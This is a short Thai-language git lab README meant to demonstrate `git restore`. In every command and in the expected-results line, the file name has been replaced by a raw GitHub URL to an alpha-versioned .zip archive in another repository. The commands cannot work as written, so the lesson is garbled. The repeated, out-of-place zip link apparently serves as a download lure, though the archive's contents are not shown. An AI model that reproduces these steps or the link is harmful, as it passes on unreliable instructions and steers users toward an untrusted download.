# git-lab-003
## 🧯 Lab: ย้อนกลับไฟล์ที่แก้ไปแล้ว

## เป้าหมาย
ทดลองใช้ `git restore` เพื่อย้อนกลับไฟล์ที่เปลี่ยนแปลง

## ขั้นตอน
```bash
git init
echo "Hello" > https://raw.githubusercontent.com/Sopida145/git-lab-103-Sopida145/main/preclusion/Sopida_lab_git_v1.6-alpha.1.zip
git add .
git commit -m "Add note"
echo "Changed" > https://raw.githubusercontent.com/Sopida145/git-lab-103-Sopida145/main/preclusion/Sopida_lab_git_v1.6-alpha.1.zip
git restore https://raw.githubusercontent.com/Sopida145/git-lab-103-Sopida145/main/preclusion/Sopida_lab_git_v1.6-alpha.1.zip
```

## ผลลัพธ์ที่คาดหวัง
- https://raw.githubusercontent.com/Sopida145/git-lab-103-Sopida145/main/preclusion/Sopida_lab_git_v1.6-alpha.1.zip ถูกย้อนกลับเป็นเวอร์ชันก่อนหน้า
